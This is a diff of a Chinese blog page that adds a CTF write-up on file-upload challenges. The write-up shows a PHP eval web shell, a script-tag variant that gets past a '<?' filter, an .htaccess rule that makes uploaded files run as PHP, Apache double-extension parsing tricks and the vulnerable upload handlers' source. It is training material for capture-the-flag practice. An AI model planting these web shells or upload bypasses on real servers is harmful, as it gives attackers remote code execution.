@@ -5,7 +5,7 @@
   <meta charset="utf-8">
   
   
-  <title>ARP欺骗 | AceNyaRu</title>
+  <title>几个文件上传 | AceNyaRu</title>
   <meta name="author" content="amanokuya" />
   <meta http-equiv="Cache-Control" content="no-transform" />
   <meta http-equiv="Cache-Control" content="no-siteapp" />
@@ -16,13 +16,15 @@
   
     <meta name="keywords" content="" />
   
-  <meta property="og:type" content="article">
-<meta property="og:title" content="ARP欺骗">
-<meta property="og:url" content="https://amanokuya.github.io/2023/10/29/ARP%E6%AC%BA%E9%AA%97/index.html">
+  <meta name="description" content="[GXYCTF 2019]BabyUpload上传一个 &lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt; 会被检测到&lt;??换一种方式 123&lt;script language&#x3D;&amp;#x27;php&amp;#x27;&gt; @eval($_POST[&amp;#x27;cmd&amp;#x27;]);&lt;&#x2F;script&gt; 上传成功，但是不能上传带’ph’的文件，上">
+<meta property="og:type" content="article">
+<meta property="og:title" content="几个文件上传">
+<meta property="og:url" content="https://amanokuya.github.io/2023/11/30/%E5%87%A0%E4%B8%AA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
 <meta property="og:site_name" content="AceNyaRu">
+<meta property="og:description" content="[GXYCTF 2019]BabyUpload上传一个 &lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt; 会被检测到&lt;??换一种方式 123&lt;script language&#x3D;&amp;#x27;php&amp;#x27;&gt; @eval($_POST[&amp;#x27;cmd&amp;#x27;]);&lt;&#x2F;script&gt; 上传成功，但是不能上传带’ph’的文件，上">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-10-29T08:05:25.000Z">
-<meta property="article:modified_time" content="2023-10-29T08:05:25.700Z">
+<meta property="article:published_time" content="2023-11-30T12:43:24.000Z">
+<meta property="article:modified_time" content="2023-11-30T14:10:32.644Z">
 <meta property="article:author" content="amanokuya">
 <meta name="twitter:card" content="summary">
   
@@ -129,15 +131,15 @@
 
             <article itemscope itemtype="https://schema.org/Article">
     
-    <link itemprop="mainEntityOfPage" href="https://amanokuya.github.io/2023/10/29/ARP%E6%AC%BA%E9%AA%97/">
+    <link itemprop="mainEntityOfPage" href="https://amanokuya.github.io/2023/11/30/%E5%87%A0%E4%B8%AA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
     <div class="kratos-hentry kratos-post-inner clearfix">
         <header class="kratos-entry-header">
             
-                <h1 class="kratos-entry-title text-center" itemprop="name headline">ARP欺骗</h1>
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">几个文件上传</h1>
             
             
             <ul class="kratos-post-meta text-center">
-                <li><time datetime="2023-10-29T08:05:25.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2023-10-29</time></li>
+                <li><time datetime="2023-11-30T12:43:24.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2023-11-30</time></li>
                 <li itemprop="author" itemscope itemtype="https://schema.org/Person">
                     <i class="fa fa-user"></i> 作者 <span itemprop="name">amanokuya</span>
                 </li>
@@ -145,7 +147,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        0
+                        ~5.05K
                     
                     字
                 </li>
@@ -156,12 +158,24 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1698566725700"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1701353432644"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
             <hr />
-            <div itemprop="articleBody"></div>
+            <div itemprop="articleBody"><h3 id="GXYCTF-2019-BabyUpload"><a href="#GXYCTF-2019-BabyUpload" class="headerlink" title="[GXYCTF 2019]BabyUpload"></a>[GXYCTF 2019]BabyUpload</h3><p>上传一个 <code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code> 会被检测到<code>&lt;?</code>?<br>换一种方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&#x27;php&#x27;&gt; </span><br><span class="line">@eval($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>上传成功，但是不能上传带’ph’的文件，上传.htaccess文件将上传的.jpeg解析成.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &#x27;cmd&#x27;&gt;  //刚才上传的文件叫cmd.php</span><br><span class="line">SetHandler application/x-http-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+<p>蚁剑连接找flag即可, 或者<code>cmd=show_source(&#39;/flag&#39;)</code><br> 看一下<code>index.php</code><br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">session_start();</span><br><span class="line">echo &quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=utf-8\&quot; /&gt; </span><br><span class="line">&lt;title&gt;Upload&lt;/title&gt;</span><br><span class="line">&lt;form action=\&quot;\&quot; method=\&quot;post\&quot; enctype=\&quot;multipart/form-data\&quot;&gt;</span><br><span class="line">上传文件&lt;input type=\&quot;file\&quot; name=\&quot;uploaded\&quot; /&gt;</span><br><span class="line">&lt;input type=\&quot;submit\&quot; name=\&quot;submit\&quot; value=\&quot;上传\&quot; /&gt;</span><br><span class="line">&lt;/form&gt;&quot;;</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_SESSION[&#x27;user&#x27;]))&#123;</span><br><span class="line">    $_SESSION[&#x27;user&#x27;] = md5((string)time() . (string)rand(100, 1000));</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_FILES[&#x27;uploaded&#x27;])) &#123;</span><br><span class="line">    $target_path  = getcwd() . &quot;/upload/&quot; . md5($_SESSION[&#x27;user&#x27;]);</span><br><span class="line">    $t_path = $target_path . &quot;/&quot; . basename($_FILES[&#x27;uploaded&#x27;][&#x27;name&#x27;]);</span><br><span class="line">    $uploaded_name = $_FILES[&#x27;uploaded&#x27;][&#x27;name&#x27;];</span><br><span class="line">    $uploaded_ext  = substr($uploaded_name, strrpos($uploaded_name,&#x27;.&#x27;) + 1);</span><br><span class="line">    $uploaded_size = $_FILES[&#x27;uploaded&#x27;][&#x27;size&#x27;];</span><br><span class="line">    $uploaded_tmp  = $_FILES[&#x27;uploaded&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line"> </span><br><span class="line">    if(preg_match(&quot;/ph/i&quot;, strtolower($uploaded_ext)))&#123;</span><br><span class="line">        die(&quot;后缀名不能有ph！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        if ((($_FILES[&quot;uploaded&quot;][&quot;type&quot;] == &quot;</span><br><span class="line">            &quot;) || ($_FILES[&quot;uploaded&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;) || ($_FILES[&quot;uploaded&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;)) &amp;&amp; ($_FILES[&quot;uploaded&quot;][&quot;size&quot;] &lt; 2048))&#123;</span><br><span class="line">            $content = file_get_contents($uploaded_tmp);</span><br><span class="line">            if(preg_match(&quot;/\&lt;\?/i&quot;, $content))&#123;</span><br><span class="line">                die(&quot;诶，别蒙我啊，这标志明显还是php啊&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                mkdir(iconv(&quot;UTF-8&quot;, &quot;GBK&quot;, $target_path), 0777, true);</span><br><span class="line">                move_uploaded_file($uploaded_tmp, $t_path);</span><br><span class="line">                echo &quot;&#123;$t_path&#125; succesfully uploaded!&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;上传类型也太露骨了吧！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<h3 id="MoeCTF-2022-what-are-y0u-uploading"><a href="#MoeCTF-2022-what-are-y0u-uploading" class="headerlink" title="[MoeCTF 2022]what are y0u uploading"></a>[MoeCTF 2022]what are y0u uploading</h3><p>上传一个文件试试 <code>可恶的hacker！只能上传.png或.jpg或gif!</code><br>估计是上传允许的文件然后抓包修改<br>上传后修改后缀 <code>文件上传成功！filename：cmd.jpg 我不想要这个特洛伊文件，给我一个f1ag.php 我就给你flag!</code><br>把文件名修改成<code>&#39;f1ag.php&#39;</code> 上传获得flag<code>NSSCTF&#123;955c9fbb-3d87-422e-806a-18601f5b9b1d&#125;</code></p>
+<h3 id="UUCTF-2022-新生赛-ez-upload"><a href="#UUCTF-2022-新生赛-ez-upload" class="headerlink" title="[UUCTF 2022 新生赛]ez_upload"></a>[UUCTF 2022 新生赛]ez_upload</h3><p>根据标签查了一下 apach 漏洞<br>apache 相关的解析漏洞有两个：<br>%0a (CVE-2017-15715)<br>未知后缀 test.php.xxx</p>
+<p>首先尝试<code>/x0a</code> 但是还是被过滤了，可能也跟第一题一样检查了内容？<br>修改内容后还是不行，尝试下一个未知后缀漏洞 <code>1.php.jp</code>  上传成功<code>文件存储在: upload/cmd.php.</code><br>尝试蚁剑连接<br>apech是从右向左解析文件后缀，但是为什么<code>1.jp.php</code>能被解析成功，而<code>1.php.jp  1.jp.php.us</code>不能被解析？</p>
+<p>(查了一下)[<a target="_blank" rel="noopener" href="https://blog.werner.wiki/file-resolution-vulnerability-apache/]">https://blog.werner.wiki/file-resolution-vulnerability-apache/]</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">那么aaa.php.xxx为何没有被作为php代码执行呢？我猜是这样的，当然只是我的猜测，实在是找不到相关资料，只好猜了。</span><br><span class="line">Apache看到文件aaa.php.xxx，按照多后缀名的解析规则，认为该文件是php程序文件，把该文件作为php程序文件处理。怎么处理呢？交给php解释器，Apache本身并不懂php。</span><br><span class="line">而php解释器却有着和Apache不同的后缀解析规则，可能只认最后一个后缀，故而认为aaa.php.xxx不是php程序文件，拒绝执行。在我的测试环境中，php以模块（module）的模式工作于Apache的领导下。这种模式下php接受到领导Apache分配的任务——aaa.php.xxx，一看，不是php程序文件，没法执行，但也没有报错，而是返回了文件内容本身。</span><br><span class="line">php还可以以FASTCGI的模式工作于Apache中，此种模式下php遇到类似aaa.php.xxx这种不是php程序的文件，会触发500错误。</span><br></pre></td></tr></table></figure>
+
+<p>附上upload.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//echo $_FILES[&#x27;file&#x27;][&#x27;name&#x27;];echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">//echo $_FILES[&#x27;file&#x27;][&#x27;type&#x27;];echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">$flag1=true;</span><br><span class="line">$flag2=true;</span><br><span class="line">$file_name=$_FILES[&#x27;file&#x27;][&#x27;name&#x27;];</span><br><span class="line">$file_type=$_FILES[&#x27;file&#x27;][&#x27;type&#x27;];</span><br><span class="line">$allow_file_type=[&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;];</span><br><span class="line">$allowedExts = array(&quot;php&quot;, &quot;php3&quot;, &quot;php5&quot;, &quot;phtml&quot;,&quot;htaccess&quot;);</span><br><span class="line">$ext=substr($file_name,strpos($file_name,&quot;.&quot;)+1);</span><br><span class="line">if(!in_array(strtolower($file_type),$allow_file_type))&#123;</span><br><span class="line">    $flag1=false;</span><br><span class="line">    die(&quot;你好坏哦，不理你了&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(in_array(strtolower($ext),$allowedExts))&#123;</span><br><span class="line">    $flag2=false;</span><br><span class="line">    die(&quot;你好坏哦，不理你了&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if($flag1&amp;&amp;$flag2)&#123;</span><br><span class="line">    if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))</span><br><span class="line">    &#123;</span><br><span class="line">        echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; 文件已经存在。 &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        // 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span><br><span class="line">        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">        echo &quot;文件存储在: &quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &quot;Hacker，你好坏哟&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
         </div>
         
             <div class="kratos-copyright text-center clearfix">
@@ -214,7 +228,7 @@
     <script type="text/javascript">
         $(()=>{
             new QRCode("wechat-qr", {
-                text: "https://amanokuya.github.io/2023/10/29/ARP%E6%AC%BA%E9%AA%97/",
+                text: "https://amanokuya.github.io/2023/11/30/%E5%87%A0%E4%B8%AA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/",
                 width: 150,
                 height: 150,
                 correctLevel : QRCode.CorrectLevel.H
@@ -226,9 +240,10 @@
             const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
             const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
             const twitterBase   = "https://twitter.com/intent/tweet?";
-            const hostUrl       = "https://amanokuya.github.io/2023/10/29/ARP%E6%AC%BA%E9%AA%97/";
-            const title         = "「ARP欺骗」";
-            const excerpt       = ``;
+            const hostUrl       = "https://amanokuya.github.io/2023/11/30/%E5%87%A0%E4%B8%AA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/";
+            const title         = "「几个文件上传」";
+            const excerpt       = `[GXYCTF 2019]BabyUpload上传一个 &lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt; 会被检测到&lt;??换一种方式
+123&lt;script language=&#x27...`;
             let _URL;
             switch (dest) {
                 case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
@@ -250,7 +265,7 @@
                     
                 </div>
                 <div class="pull-date">
-                    <time datetime="2023-10-29T08:05:25.700Z" itemprop="dateModified">最后编辑：2023-10-29</time>
+                    <time datetime="2023-11-30T14:10:32.644Z" itemprop="dateModified">最后编辑：2023-11-30</time>
                 </div>
             </div>
         </footer>
@@ -259,13 +274,9 @@
         <nav class="navigation post-navigation clearfix" role="navigation">
             
             <div class="nav-previous clearfix">
-                <a title=" 报错注入" href="/2023/09/13/报错注入/">&lt; 上一篇</a>
+                <a title=" 最佳适应算法" href="/2023/11/26/最佳适应算法/">&lt; 上一篇</a>
             </div>
             
-            
-            <div class="nav-next clearfix">
-                <a title=" 最佳适应算法" href="/2023/11/26/最佳适应算法/">下一篇 &gt;</a>
-            </div>
             
         </nav>
     
